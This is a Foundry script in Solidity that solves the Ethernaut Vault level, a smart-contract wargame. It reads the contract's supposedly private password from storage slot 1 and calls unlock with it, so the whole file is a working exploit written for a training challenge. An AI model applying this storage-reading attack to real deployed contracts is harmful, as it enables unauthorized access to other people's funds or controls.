// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Vault } from "src/Level08.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Vault instance = Vault(instanceAddress);

        bytes32 password = vm.load(instanceAddress, bytes32(uint256(1)));
        instance.unlock(password);
        console2.log(instance.locked());

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
